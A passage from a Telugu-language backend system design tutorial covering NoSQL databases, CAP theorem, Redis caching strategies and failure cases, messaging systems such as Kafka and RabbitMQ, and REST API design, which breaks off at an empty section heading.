- **Why it's used:** నెట్‌వర్క్ కాల్స్ తగ్గుతాయి, డేటాబేస్ లోపలే రన్ అవుతుంది కాబట్టి డేటా మానిప్యులేషన్ చాలా ఫాస్ట్‌గా జరుగుతుంది.

---

రిలేషనల్ డేటాబేస్‌ల (SQL) తర్వాత, ఇంటర్నెట్ ప్రపంచంలో డేటా విపరీతంగా పెరిగిపోయింది. లక్షల మంది యూజర్లు ఒకేసారి సోషల్ మీడియా పోస్టులు పెట్టడం, చాట్ చేయడం, లేదా ఈ-కామర్స్ సైట్లలో ప్రొడక్ట్స్ వెతకడం లాంటి అన్‌స్ట్రక్చర్డ్ (Unstructured) మరియు హై-స్పీడ్ డేటాని హ్యాండిల్ చేయడానికి **NoSQL** డేటాబేస్‌లు పుట్టుకొచ్చాయి.

వీటిని కూడా మన స్టైల్‌లో—అవి ఏంటి, ఏ సినారియోలో ఏది వాడాలి, మరియు రిలేషనల్ నుండి NoSQL కి ఎందుకు మారాం అనే కోణంలో తెలుగులో క్లియర్‌గా చూద్దాం.

---

## NoSQL

---

## 1. The Heavy Hitters (NoSQL రకాలు)

NoSQL లో డేటా స్టోర్ చేసే విధానాన్ని బట్టి వేర్వేరు డేటాబేస్‌లు ఉన్నాయి.

### 🍃 MongoDB (Document Store)

- **What it is:** ఇది మోస్ట్ పాపులర్ NoSQL డేటాబేస్. ఇక్కడ రోస్ మరియు కాలమ్స్ ఉండవు. డేటా అంతా **JSON** (సాంకేతికంగా BSON) ఫార్మాట్‌లో స్టోర్ అవుతుంది.
- **Why we use it:** మీ డేటా స్ట్రక్చర్ స్థిరంగా లేనప్పుడు (ఉదా: ఒక ప్రొడక్ట్‌కి 5 ఫీచర్లు ఉంటే, ఇంకో ప్రొడక్ట్‌కి 10 ఫీచర్లు ఉండొచ్చు), ఎలాంటి స్కీమా (Schema) రూల్స్ లేకుండా డేటాను ఈజీగా సేవ్ చేయడానికి ఇది బెస్ట్.

### ⚡ DynamoDB (Key-Value / Document Store)

- **What it is:** ఇది AWS (Amazon) వాళ్ళ ఫుల్లీ మేనేజ్డ్ నో-ఎస్క్వియల్ డేటాబేస్.
- **Why we use it:** ఇది అపరిమితమైన స్కేలింగ్‌ని ఇస్తుంది. డేటా సైజ్ ఎంత పెరిగినా (Terabytes లో ఉన్నా), దీని రెస్పాన్స్ టైమ్ ఎప్పుడూ సింగిల్ డిజిట్ మిల్లీసెకండ్స్ లోనే ఉంటుంది. దీనికి మెయింటెనెన్స్ అవసరం లేదు (Serverless).

### 🍇 Cassandra (Wide-Column Store)

- **What it is:** ఫేస్‌బుక్ మరియు నెట్‌ఫ్లిక్స్ లాంటి కంపెనీలు వాడే పవర్‌ఫుల్ డేటాబేస్.
- **Why we use it:** ప్రతి సెకనుకి లక్షల కొద్దీ 'Write' ఆపరేషన్స్ (ఉదా: లైవ్ లొకేషన్ ట్రాకింగ్, క్లిక్‌స్ట్రీమ్ డేటా, ఐఓటీ సెన్సార్ డేటా) జరుగుతున్నప్పుడు, ఒక్క రికార్డ్ కూడా మిస్ అవ్వకుండా డిస్ట్రిబ్యూట్ చేయడంలో కాసాండ్రా కింగ్.

### 🟥 Redis (In-Memory Data Store)

- **What it is:** ఇది డేటాని హార్డ్ డిస్క్‌లో కాకుండా పూర్తిగా **RAM (Memory)** లో స్టోర్ చేస్తుంది.
- **Why we use it:** RAM లో ఉంటుంది కాబట్టి ఇది ఎక్స్‌ట్రీమ్‌గా ఫాస్ట్. దీన్ని మెయిన్ డేటాబేస్ లాగా కాకుండా, తరచూ వాడే డేటాని దాచడానికి (**Caching**), మరియు యూజర్ **Sessions** మెయింటెనెన్ కి వాడతాం.

---

## 2. Structural Concepts (MongoDB కోణంలో)

### 📂 Collections & Documents

- **Documents:** SQL లోని ఒక 'Row' ని NoSQL లో **Document** అంటారు. ఇది కీ-వాల్యూ జంటలతో కూడిన ఒక JSON ఆబ్జెక్ట్.
- **Collections:** SQL లోని ఒక 'Table' ని ఇక్కడ **Collection** అంటారు. ఇది మల్టిపుల్ డాక్యుమెంట్ల సమూహం.

### 🔍 Secondary Index

- NoSQL లో బై-డిఫాల్ట్ ఒక ప్రైమరీ ఐడి (`_id`) పై ఇండెక్స్ ఉంటుంది. కానీ మీరు వేరే కాలమ్ (ఉదా: `email` లేదా `status`) బేస్ చేసుకొని వెతకాలంటే, SQL లాగే ఇక్కడ కూడా **Secondary Index** క్రియేట్ చేయాలి. ఇది క్వెరీలని ఫాస్ట్ చేస్తుంది.

### 📊 Aggregation (The Analytics Pipeline)

- NoSQL లో కాంప్లెక్స్ జాయిన్స్ (Joins) ఉండవు. కాబట్టి డేటాని ఫిల్టర్ చేయడానికి, గ్రూప్ చేయడానికి (ఉదా: టోటల్ సేల్స్ కౌంట్ కనుక్కోవడానికి) **Aggregation Pipeline** వాడతాం. ఇది ఒక అసెంబ్లీ లైన్ లాంటిది—ఒక స్టెప్ లో ఫిల్టర్ అయిన డేటా, నెక్స్ట్ స్టెప్ లో గ్రూప్ అవుతూ ఫైనల్ రిజల్ట్ వస్తుంది.

---

## 3. Distributed Architecture (పెద్ద నెట్‌వర్క్‌లో డేటా మేనేజ్‌మెంట్)

NoSQL డేటాబేస్‌లు ఒకే కంప్యూటర్‌లో కాకుండా వందల కంప్యూటర్లలో (Cluster) రన్ అవ్వడానికి డిజైన్ చేయబడ్డాయి.

### 👥 Replication & Sharding

- **Replication:** ఒకే డేటాని మల్టిపుల్ సర్వర్లలో కాపీ చేసి ఉంచడం. ఒక సర్వర్ క్రాష్ అయినా డేటా పోకుండా (High Availability) ఉండటానికి ఇది ఉపయోగపడుతుంది.
- **Sharding:** డేటా సైజ్ పెరిగినప్పుడు, దాన్ని ముక్కలు చేసి వేర్వేరు సర్వర్లలో పంచడం (Horizontal Scaling). NoSQL లో షార్డింగ్ అనేది ఇన్-బిల్ట్ గా చాలా సులభంగా జరుగుతుంది.

---

## 4. Theoretical System Design (The Rules of Distributed Systems)

డిస్ట్రిబ్యూటెడ్ సిస్టమ్స్ డిజైన్ చేసేటప్పుడు మనం తెలుసుకోవాల్సిన అత్యంత ముఖ్యమైన థియరీ ఇది.

### 📐 CAP Theorem

ఒక నెట్‌వర్క్ బ్రేక్‌డౌన్ (Partition) అయినప్పుడు, ఏ డిస్ట్రిబ్యూటెడ్ సిస్టమ్ అయినా ఈ కింది మూడింట్లో **కేవలం రెండు ఫీచర్లను మాత్రమే** ఇవ్వగలదు:

1. **Consistency (C):** అన్ని సర్వర్లలో ఒకే సమయంలో ఒకే డేటా కనిపించాలి. ఒకరు డేటా అప్‌డేట్ చేస్తే, ప్రపంచంలో ఎక్కడి నుండి చూసినా వెంటనే ఆ కొత్త డేటాలే కనిపించాలి.
2. **Availability (A):** సిస్టమ్‌లోని ఏ సర్వర్ అయినా సరే, ప్రతి రిక్వెస్ట్‌కి ఎల్లప్పుడూ సక్సెస్ ఫుల్ రెస్పాన్స్ ఇవ్వాలి (డేటా పాతదా కొత్తదా అనేది పక్కన పెడితే).
3. **Partition Tolerance (P):** సర్వర్ల మధ్య నెట్‌వర్క్ కనెక్షన్ కట్ అయినా (Partition జరిగినా), సిస్టమ్ మొత్తం క్రాష్ అవ్వకుండా రన్ అవ్వాలి.

> 💡 **The Reality:** రియల్ వరల్డ్ లో నెట్‌వర్క్ ప్రాబ్లమ్స్ (P) కామన్. కాబట్టి మనం నెట్‌వర్క్ ఇష్యూ వచ్చినప్పుడు సిస్టమ్ **Consistent (CP)** గా ఉండాలా లేదా **Available (AP)** గా ఉండాలా అనేది డిసైడ్ చేసుకోవాలి. (ఉదా: బ్యాంకింగ్ కి CP కావాలి, సోషల్ మీడియా కి AP సరిపోతుంది).

### ⏳ Eventual Consistency

- **What it is:** ఇది AP (Availability) సిస్టమ్స్ లో కనిపించే ఒక ఫీచర్.
- **How it works:** మీరు ఫేస్‌బుక్‌లో ఒక ఫోటో అప్‌లోడ్ చేశారు. అది అమెరికా సర్వర్‌లో వెంటనే సేవ్ అవుతుంది (Consistent). కానీ ఇండియాలో ఉన్న మీ ఫ్రెండ్ కి ఆ ఫోటో కనిపించడానికి కొన్ని సెకన్లు టైమ్ పట్టవచ్చు (ఎందుకంటే అమెరికా సర్వర్ నుండి ఇండియా సర్వర్‌కి డేటా కాపీ అవ్వాలి). కానీ కొంత సమయం తర్వాత (Eventually) ప్రపంచవ్యాప్తంగా ఉన్న అన్ని సర్వర్లలోకి ఆ డేటా సింక్ అయిపోతుంది. దీన్నే **Eventual Consistency** అంటారు.

---

# 3: Caching

క్యాషింగ్ (Caching) అనేది ఒక సిస్టమ్ యొక్క వేగాన్ని (Performance) 10x నుండి 100x వరకు పెంచే అత్యంత పవర్‌ఫుల్ టెక్నాలజీ. డేటాబేస్ (SQL/NoSQL) నుండి ప్రతిసారీ డేటా తెచ్చుకోవడం స్లో అవుతుంది కాబట్టి, తరచూ వాడే డేటాని అత్యంత వేగవంతమైన RAM (In-Memory) లో దాచడమే క్యాషింగ్.

ఈ క్యాషింగ్ కింగ్ అయిన **Redis** మరియు వివిధ క్యాషింగ్ స్ట్రాటజీలను మనం తెలుగులో క్లియర్‌గా నేర్చుకుందాం.

---

## 1. Redis Data Types & Features (The Swiss Army Knife)

రెడిస్ కేవలం ఒక సింపుల్ క్యాషే మాత్రమే కాదు, ఇందులో రకరకాల డేటా స్ట్రక్చర్స్ ఉన్నాయి.

- **Strings:** బేసిక్ కీ-వాల్యూ (Key-Value) స్టోరేజ్. టెక్స్ట్, JSON లేదా ఇమేజ్ బైనరీ డేటాని కూడా ఇందులో దాచవచ్చు.
- **Lists:** ఇందులో డేటా ఇన్సర్ట్ చేసిన ఆర్డర్ లో సేవ్ అవుతుంది. దీన్ని సింపుల్ మెసేజ్ క్యూ (Queue) లాగా వాడుకోవచ్చు.
- **Sets:** డూప్లికేట్స్ లేని యూనిక్ ఐటమ్స్ లిస్ట్. (ఉదా: ఒక పోస్ట్‌ని ఎంతమంది యూనిక్ యూజర్లు లైక్ చేశారో ట్రాక్ చేయడానికి).
- **Hashes:** ఒక ఆబ్జెక్ట్ లోపల మళ్ళీ కీ-వాల్యూస్ పెట్టడం (ఉదా: యూజర్ ప్రొఫైల్—`name`, `age`, `email`).
- **Sorted Sets (ZSET):** ప్రతి ఐటమ్‌కి ఒక 'Score' ఉంటుంది. ఆ స్కోర్ బేస్ చేసుకొని డేటా ఆటోమేటిక్‌గా సార్ట్ అయి ఉంటుంది.

### ⏱️ TTL (Time to Live)

- **What it is:** ఒక క్యాషే కీ ఎంతసేపు బతికి ఉండాలో చెప్పే టైమర్ (ఉదా: 10 నిమిషాలు). ఆ టైమ్ అవ్వగానే రెడిస్ ఆ డేటాని ఆటోమేటిక్‌గా డిలీట్ చేస్తుంది. దీనివల్ల క్యాషే మెమరీ ఫుల్ అవ్వకుండా ఉంటుంది.

---

## 2. Redis Advanced Use Cases (రియల్-వరల్డ్ ఉపయోగాలు)

రెడిస్‌ని క్యాషింగ్ కాకుండా సిస్టమ్ డిజైన్‌లో ఈ కింది అద్భుతమైన ఫీచర్స్ కోసం వాడతారు:

- **Pub/Sub (Publish/Subscribe):** ఇది ఒక ఈవెంట్ డ్రివెన్ సిస్టమ్. ఒక సర్వీస్ మెసేజ్ పంపితే (Publish), ఆ ఛానల్‌ని వినే మిగతా అన్ని సర్వీసెస్ (Subscribe) కి ఆ మెッセージ అందుతుంది. (ఉదా: లైవ్ నోటిఫికేషన్స్).
- **Streams:** అపాచీ కాఫ్కా (Kafka) లాంటి ఒక పవర్‌ఫుల్ లాగ్-బేస్డ్ డేటా స్ట్రక్చర్. పెద్ద మొత్తంలో వచ్చే లైవ్ డేటాని (ఉదా: యాప్ లాగ్స్, చాట్ మెసేజెస్) ఆర్డర్ తప్పకుండా ప్రాసెస్ చేయడానికి ఇది వాడతారు.
- **Distributed Lock (Redlock):** మైక్రోసర్వీసెస్ ఆర్కిటెక్చర్‌లో మల్టిపుల్ సర్వర్లు ఉన్నప్పుడు, ఒకే రిసోర్స్‌ని ఒకేసారి ఇద్దరు మార్చకుండా గ్లోబల్ గా లాక్ వేయడానికి రెడిస్ వాడతారు.
- **Rate Limiting:** మీ API ని ఎవరైనా హ్యాకర్ లేదా బాట్ (Bot) సెకనుకి వందల సార్లు కాల్ చేసి సర్వర్‌ని డౌన్ చేయకుండా, "ఒక యూజర్ నిమిషానికి 10 సార్లు మాత్రమే కాల్ చేయాలి" అని కంట్రోల్ చేయడానికి రెడిస్ ఇన్‌-మెమరీ కౌంటర్లని వాడతారు.
- **Leaderboard:** గేమింగ్ యాప్స్ లేదా కోడింగ్ వెబ్‌సైట్లలో లైవ్ ర్యాంకులు చూపించడానికి **Sorted Sets** వాడతారు. మిలియన్ల యూజర్లు ఉన్నా సరే సెకనులో ర్యాంక్ క్యాలిక్యులేట్ చేస్తుంది.

---

## 3. Caching Strategies (డేటా ఎక్కడ, ఎలా రాయాలి/చదవాలి)

అప్లికేషన్ మరియు డేటాబేస్ మధ్య క్యాషేని ఎలా ప్లేస్ చేయాలో చెప్పే స్ట్రాటజీలు ఇవి.

### 📖 Cache Aside (Most Popular)

- **How it works:** క్లయింట్ డేటా అడిగినప్పుడు, అప్లికేషన్ మొదట క్యాషే లో వెతుకుతుంది (**Cache Hit**). ఒకవేళ అక్కడ లేకపోతే (**Cache Miss**), డేటాబేస్ నుండి తెచ్చి, క్యాషే లో సేవ్ చేసి యూజర్‌కి ఇస్తుంది.
- **Pros:** క్యాషే సర్వర్ డౌన్ అయినా అప్లికేషన్ డైరెక్ట్‌గా డేటాబేస్ నుండి రన్ అవుతుంది.

### ✍️ Write Through & Read Through

- **Read Through:** అప్లికేషన్ నేరుగా క్యాషేని మాత్రమే అడుగుతుంది. క్యాషే మిస్ అయితే, క్యాషే సాఫ్ట్‌వేరే స్వయంగా డేటాబేస్ నుండి డేటా తెచ్చుకుని అప్లికేషన్‌కి ఇస్తుంది.
- **Write Through:** అప్లికేషన్ కొత్త డేటాని మొదట క్యాషే లో రాస్తుంది. క్యాషే వెంటనే దాన్ని డేటాబేస్ లో కూడా సేవ్ చేస్తుంది. డేటా ఎప్పుడూ సింక్ లో ఉంటుంది.

### ⏳ Write Behind (Write Back - The Upgrade)

- **How it works:** అప్లికేషన్ డేటాని కేవలం క్యాషే (RAM) లో మాత్రమే రాసి వదిలేస్తుంది. క్యాషే బ్యాక్‌గ్రౌండ్‌లో ప్రతి 5 లేదా 10 నిమిషాలకి ఒకేసారి అన్ని రికార్డులను గ్రూప్ గా (Bulk/Batch) డేటాబేస్ లో సేవ్ చేస్తుంది.
- **Why it's amazing:** 'Write' ఆపరేషన్స్ విపరీతంగా ఫాస్ట్ అవుతాయి. కానీ క్యాషే సర్వర్ లోపల డేటాబేస్ లో సేవ్ అవ్వకముందే కరెంట్ పోతే డేటా లాస్ అయ్యే రిస్క్ ఉంది.

---

## 4. Cache Eviction & Failure Scenarios (ఇంటర్వ్యూ క్వశ్చన్స్)

క్యాషేని ప్రొడక్షన్ లో వాడేటప్పుడు వచ్చే అతిపెద్ద సమస్యలు మరియు వాటి సొల్యూషన్స్ ఇవి.

### ❌ Cache Invalidation

- **What it is:** డేటాబేస్‌లో ఒక యూజర్ తన పేరు మార్చుకున్నప్పుడు, క్యాషే లో ఉన్న పాత పేరుని డిలీట్ చేయడాన్నే కాష్ ఇన్వాలిడేషన్ అంటారు. _"కంప్యూటర్ సైన్స్ లో క్యాషే ఇన్వాలిడేషన్ అనేది అత్యంత కష్టమైన పని"_ అనే సామెత ఉంది.

### 💥 Cache Penetration

- **The Problem:** ఒక హ్యాకర్ మీ డేటాబేస్‌లోనే లేని ఒక ఐడిని (ఉదా: `user_id = -999`) మళ్ళీ మళ్ళీ వెతుకుతున్నాడు. అది క్యాషే లో ఉండదు, డేటాబేస్ లోనూ ఉండదు. దీనివల్ల ప్రతి రిక్వెస్ట్ క్యాషేని దాటి డైరెక్ట్‌గా డేటాబేస్ పై పడి డేటాబేస్ క్రాష్ అవుతుంది.
- **The Solution:** ఒకవేళ డేటాబేస్ లో డేటా లేకపోయినా, క్యాషే లో `{-999: NULL}` అని ఒక 5 నిమిషాల TTL తో సేవ్ చేయాలి. లేదా **Bloom Filters** వాడాలి.

### 🐂 Cache Stampede (Dog-Piling)

- **The Problem:** మీ హోమ్‌పేజీ డేటా క్యాషే లో ఉంది. దానికి పెట్టిన TTL టైమ్ అయిపోయి రాత్రి 12 గంటలకి ఆ కీ డిలీట్ (Expire) అయింది. సరిగ్గా అదే సెకనులో లక్ష మంది యూజర్లు సైట్ ఓపెన్ చేశారు. అప్పుడు ఆ లక్ష రిక్వెస్ట్‌లు ఒకేసారి డేటాబేస్ పై పడతాయి. దాన్నే Cache Stampede అంటారు.
- **The Solution:** మ్యుటెక్స్ లాక్స్ (Locks) వాడి, మొదటి ఒక్క రిక్వెస్ట్ ని మాత్రమే డేటాబేస్ కి అనుమతించి, అది క్యాషే ని రీఫ్రెష్ చేసాక మిగతా వాళ్లకి ఆ క్యాషే నుండి డేటా ఇవ్వాలి.

---

# 4: Messaging Systems

బ్యాకెండ్ సిస్టమ్ డిజైన్‌లో **Messaging Systems** అనేవి వేర్వేరు సర్వీసెస్ (Microservices) ఒకదానితో ఒకటి అసింక్రోనస్‌గా (Asynchronously—అంటే ఒకదాని కోసం ఒకటి వెయిట్ చేయకుండా) మాట్లాడుకోవడానికి వాడే అత్యంత కీలకమైన టెక్నాలజీ. ఉదాహరణకు, యూజర్ ఆర్డర్ పెట్టగానే అతనికి ఈమెయిల్ పంపడం, ఇన్వాయిస్ క్రియేట్ చేయడం, నోటిఫికేషన్ పంపడం లాంటి పనులని బ్యాక్‌గ్రౌండ్‌లోకి నెట్టేయడానికి ఇవి వాడతాం.

ఈ టాపిక్స్ అన్నింటినీ మన స్టైల్‌లో—అవి ఏంటి, ఒకదాని నుండి ఇంకొకదానికి ఎందుకు అప్‌గ్రేడ్ అయ్యాం అనే కోణంలో తెలుగులో స్పష్టంగా నేర్చుకుందాం.

---

## 1. Core Architecture & Terminologies (బేసిక్ బిల్డింగ్ బ్లాక్స్)

మెసేజింగ్ సిస్టమ్స్ లో తరచూ వాడే పదాలు ఇవి:

- **Producer:** మెసేజ్‌ని లేదా ఈవెంట్‌ని క్రియేట్ చేసి పంపే అప్లికేషన్/సర్వీస్ (ఉదా: Order Service).
- **Consumer:** ఆ మెసేజ్‌ని రిసీవ్ చేసుకుని, దానిపై పని చేసే అప్లికేషన్/సర్వీస్ (ఉదా: Email Service).
- **Queue:** మెసేజ్‌లు ఒకదాని తర్వాత ఒకటి స్టోర్ అయ్యే ఒక లైన్ (FIFO - First In First Out). ఒక కన్స్యూమర్ మెసేజ్ తీసుకోగానే అది క్యూ నుండి డిలీట్ అయిపోతుంది.
- **Topic:** ఇది పబ్లిష్/సబ్‌స్క్రైబ్ (Pub/Sub) మోడల్‌లో వాడతారు. ఒక టాపిక్‌కి ఎంతమంది కన్స్యూమర్స్ అయినా కనెక్ట్ అవ్వచ్చు. పంపిన మెసేజ్ అందరికీ కాపీ అవుతుంది.

---

## 2. The Heavy Hitters (మెసేజింగ్ టూల్స్ మరియు వాటి తేడాలు)

ఈ సాఫ్ట్‌వేర్లని వాటి పనితీరును బట్టి రెండు రకాలుగా విడగొట్టవచ్చు: **Message Queues** మరియు **Event Streaming Platforms**.

### 🐇 RabbitMQ & ActiveMQ (Traditional Message Queues)

- **What it is:** ఇవి సాంప్రదాయ మెసేజ్ క్యూలు. రాబిట్-ఎమ్‌క్యూ చాలా స్మార్ట్ రూటింగ్ (Routing) ఫీచర్లను కలిగి ఉంటుంది. మెసేజ్‌ని ఏ క్యూకి పంపాలో ఇది డిసైడ్ చేస్తుంది.
- **Why we upgraded:** ఇందులో మెసేజ్ కన్స్యూమర్‌కి వెళ్ళిపోగానే క్యూ నుండి డిలీట్ అయిపోతుంది. దీనివల్ల పాత మెసేజ్‌లను మళ్ళీ రీడ్ (Replay) చేయడం కుదరదు. అలాగే సెకనుకి లక్షలాది మెసేజ్‌లు వస్తే ఇవి తట్టుకోలేవు.

### 🚀 Apache Kafka (The Event Streaming King)

- **What it is:** కాఫ్కా అనేది కేవలం ఒక క్యూ కాదు, ఇది ఒక డిస్ట్రిబ్యూటెడ్ లాగ్ (Distributed Append-Only Log). మెసేజ్‌లు కన్స్యూమర్ చదివిన తర్వాత కూడా డిలీట్ అవ్వవు, డిస్క్‌లో భద్రంగా ఉంటాయి.
- **Why it's a massive upgrade:** ఇది ఎక్స్‌ట్రీమ్‌గా ఫాస్ట్. సెకనుకి మిలియన్ల మెసేజ్‌లను హ్యాండిల్ చేయగలదు. పాత డేటాని ఎప్పుడైనా మళ్ళీ మొదటి నుండి ప్రాసెస్ (Replay) చేసుకోవచ్చు.

### ☁️ Cloud Native: Amazon SQS & SNS

- **Amazon SNS (Simple Notification Service):** ఇది ఒక **Topic** (Pub/Sub). ఒక ఈవెంట్ వస్తే దాన్ని మల్టిపుల్ క్యూలకి లేదా ఈమెయిల్స్ కి ఫ్యాన్-అవుట్ (Fan-out) చేయడానికి వాడతారు.
- **Amazon SQS (Simple Queue Service):** ఇది ఒక **Queue**. మెసేజ్‌లను దాచి ఉంచి, ఒక వర్కర్ సర్వీస్ ద్వారా ప్రాసెస్ చేయడానికి వాడే సెల్ఫ్-మేనేజ్డ్ సర్వీస్.

### ⚡ NATS

- **What it is:** అత్యంత వేగవంతమైన, లైట్ వెయిట్ మరియు పబ్-సబ్ సిస్టమ్. క్లౌడ్-నేటివ్ మైక్రోసర్వీసెస్ మధ్య అతి తక్కువ లాటెన్సీ (Low Latency) తో మెసేజ్ పాసింగ్ జరగడానికి ఇది వాడతారు.

---

## 3. Kafka Deep Dive (కాఫ్కా లోపల ఏం జరుగుతుంది?)

కాఫ్కా ఆర్కిటెక్చర్‌ని ఇంటర్వ్యూలలో ఎక్కువగా అడుగుతారు:

- **Partition:** కాఫ్కా ఒక టాపిక్‌ని మల్టిపుల్ ముక్కలుగా విడగొడుతుంది, దాన్నే పార్టిషన్ అంటారు. ఇవి వేర్వేరు సర్వీసెస్ లో స్టోర్ అవ్వడం వల్ల పారలల్ గా (Parallelism) డేటా రీడ్/రైట్ చేయవచ్చు.
- **Offset:** పార్టిషన్ లోపల ప్రతి మెసేజ్‌కి ఇచ్చే ఒక యూనిక్ నంబర్ (ఉదా: 0, 1, 2, 3...).
- **Consumer Group:** ఒకే పని చేసే మల్టిపుల్ కన్స్యూమర్స్ కలిసి ఒక గ్రూప్ గా ఏర్పడతాయి. కాఫ్కా ప్రతి పార్టిషన్‌ని గ్రూప్‌లోని ఒక కన్స్యూమర్‌కి అసైన్ చేస్తుంది. దీనివల్ల లోడ్ సమానంగా షేర్ అవుతుంది.

---

## 4. Delivery Guarantees (మెసేజ్ చేరిందా లేదా?)

నెట్‌వర్క్ ఫెయిల్యూర్స్ ఉన్నప్పుడు మెసేజ్ ఎలా డెలివరీ అవ్వాలో చెప్పే రూల్స్ ఇవి:

- **At Most Once (గరిష్టంగా ఒకసారి):** మెసేజ్ పంపాక కన్స్యూమర్ కి అందిందా లేదా అని ప్రొడ్యూసర్ పట్టించుకోడు. మెసేజ్ లాస్ అయ్యే ఛాన్స్ ఉంది కానీ డూప్లికేట్స్ రావు.
- **At Least Once (కనీసం ఒకసారి):** మెసేజ్ కన్స్యూమర్ కి అందే వరకు ప్రొడ్యూసర్ మళ్ళీ మళ్ళీ పంపుతూనే ఉంటాడు. మెసేజ్ మిస్ అవ్వదు కానీ, నెట్‌వర్క్ లాగ్ వల్ల ఒకే మెసేజ్ రెండు సార్లు వచ్చే ఛాన్స్ ఉంది (Duplicates).
- **Exactly Once (కచ్చితంగా ఒకే ఒక్కసారి):** ఇది అల్టిమేట్ ఫీచర్. మెసేజ్ ఖచ్చితంగా అందుతుంది, మరియు ఎలాంటి డూప్లికేట్స్ లేకుండా ఒకే ఒక్కసారి ప్రాసెస్ అవుతుంది. ఇది కాఫ్కాలో ట్రాన్సాక్షన్స్ ద్వారా సాధ్యమవుతుంది.

---

## 5. Resiliency & Reliability (సమస్యలను ఎదుర్కోవడం)

### 🔄 Retry & DLQ (Dead Letter Queue)

- **The Problem:** కన్స్యూమర్ ఒక మెసేజ్ ని ప్రాసెస్ చేస్తున్నప్పుడు డేటాబేస్ డౌన్ అవ్వడం వల్ల ఎర్రర్ వచ్చింది.
- **The Fix:** సిస్టమ్ ఆ మెసేజ్‌ని కొన్ని సార్లు **Retry** చేస్తుంది. అయినా సరే ఫెయిల్ అయితే, ఆ బ్యాడ్ మెసేజ్ వల్ల క్యూ మొత్తం ఆగిపోకుండా, దాన్ని పక్కన ఉన్న **DLQ (Dead Letter Queue)** కి నెట్టేస్తుంది. డెవలపర్లు తర్వాత ఆ DLQ ని చెక్ చేసి బగ్‌ని ఫిక్స్ చేయవచ్చు.

### 📐 Ordering & Idempotency

- **Ordering (క్రమం తప్పకుండా):** కొన్నిసార్లు మెసేజ్‌లు ఒకే ఆర్డర్‌లో ప్రాసెస్ అవ్వాలి (ఉదా: 1. Account Created, 2. Money Deposited). కాఫ్కాలో ఒకే **Partition Key** వాడటం ద్వారా ఒకే యూజర్ కి సంబంధించిన మెసేజ్ లన్నీ ఒకే పార్టిషన్ లోపలికి వెళ్ళి ఆర్డర్ మిస్ అవ్వకుండా చూసుకోవచ్చు.
- **Idempotency (ఐడెంపోటెన్సీ):** ఒకే మెసేజ్ లేదా రిక్వెస్ట్ పొరపాటున రెండు సార్లు వచ్చినా, సిస్టమ్ స్టేట్ మారకూడదు. (ఉదా: ఒకే ఆర్డర్ కి రెండు సార్లు పేమెంట్ కట్ అవ్వకూడదు). బ్యాకెండ్‌లో ప్రతి మెసేజ్‌కి ఒక `Unique UUID` చెక్ చేసుకొని ఆల్రెడీ ప్రాసెస్ అయితే దాన్ని ఇగ్నోర్ చేయడం ద్వారా దీన్ని సాధిస్తాం.

---

# 5: API Design

బ్యాకెండ్ సిస్టమ్ డిజైన్‌లో **API Design** అనేది అత్యంత ముఖ్యమైన కళ. మన బ్యాకెండ్ సిస్టమ్ ఎంత అద్భుతంగా ఉన్నా, ఫ్రంటెండ్ డెవలపర్లు లేదా థర్డ్-పార్టీ అప్లికేషన్లు మన సిస్టమ్‌తో మాట్లాడటానికి వాడే ఏకైక మార్గం ఈ APIలే. ఒక క్లీన్, సెక్యూర్ మరియు స్కేలబుల్ APIని ఎలా డిజైన్ చేయాలో ఈ టాపిక్స్ ద్వారా తెలుగులో క్లియర్‌గా నేర్చుకుందాం.

---

## 1. REST Best Practices (స్టాండర్డ్స్ మరియు రూల్స్)

REST APIs రాసేటప్పుడు ఇండస్ట్రీలో అందరూ ఫాలో అయ్యే కొన్ని ముఖ్యమైన బెస్ట్ ప్రాక్టీసెస్:

- **Use Nouns, Not Verbs:** URL లలో పనులు (Verbs) రాయకూడదు, కేవలం వస్తువులు/రిసోర్సెస్ (Nouns) మాత్రమే ఉండాలి.
- ❌ _తప్పు:_ `/getUserProfile` లేదా `/createNewOrder`
- ✅ _కరెక్ట్:_ `/users` లేదా `/orders`

- **HTTP Methods ని సరిగ్గా వాడటం:** పనిని బట్టి కరెక్ట్ మెథడ్ ఎంచుకోవాలి:
- `GET`: డేటాని కేవలం చదవడానికి (Read).
- `POST`: కొత్త డేటాని క్రియేట్ చేయడానికి (Create).
- `PUT`: ఒక రికార్డ్‌ని పూర్తిగా రీప్లేస్/అప్‌డేట్ చేయడానికి.
- `PATCH`: ఒక రికార్డ్‌లోని కొంత భాగాన్ని మాత్రమే అప్‌డేట్ చేయడానికి.
- `DELETE`: డేటాని డిలీట్ చేయడానికి.

- **HTTP Status Codes:** సర్వర్ నుండి వచ్చే రెస్పాన్స్ కేవలం JSON కాకుండా, సరైన స్టేటస్ కోడ్ కలిగి ఉండాలి:
- `200 OK`: సక్సెస్.
- `201 Created`: కొత్త రికార్డ్ విజయవంతంగా క్రియేట్ అయింది.
- `400 Bad Request`: క్లయింట్ పంపిన డేటా తప్పు (Validation Error).
- `401 Unauthorized`: యూజర్ లాగిన్ అవ్వలేదు.
- `403 Forbidden`: లాగిన్ అయ్యాడు కానీ ఈ డేటాని చూసే పర్మిషన్ లేదు.
- `404 Not Found`: అడిగిన యూజర్ లేదా ప్రొడక్ట్ లేదు.
- `500 Internal Server Error`: మన బ్యాకెండ్ కోడ్‌లో ఏదో బగ్ వల్ల క్రాష్ అయింది.

---

## 2. API Paradigms (The Architectural Rivals)

మనం ఫస్ట్ చాప్టర్‌లోనే వీటి బేసిక్స్ చూశాం. ఇక్కడ API డిజైన్ కోణంలో వాటి అప్‌గ్రేడ్‌ని చూద్దాం:

- **REST:** ఇది రిసోర్స్-బేస్డ్. ప్రతి రిసోర్స్‌కి విడివిడి URLలు ఉంటాయి. సింపుల్ యాప్స్ మరియు పబ్లిక్ APIలకి ఇది బెస్ట్.
- **GraphQL:** ఇది క్వెరీ-బేస్డ్. ఒకే ఒక్క ఎండ్‌పాయింట్ (`/graphql`) ఉంటుంది. క్లయింట్ తనకు కావలసిన ఫీల్డ్స్ మాత్రమే అడగవచ్చు. Over-fetching మరియు Under-fetching సమస్యలకి ఇది పక్కా అప్‌గ్రేడ్.
- **gRPC:** ఇది యాక్షన్-బేస్డ్ (RPC). ఇంటర్నల్ మైక్రోసర్వీసెస్ మధ్య అత్యంత వేగంగా, తక్కువ బ్యాండ్‌విడ్త్‌తో డేటా పంపడానికి **Protocol Buffers** ని వాడుతుంది.

---

## 3. Large Data Management (డేటా ఎక్కువ ఉన్నప్పుడు)

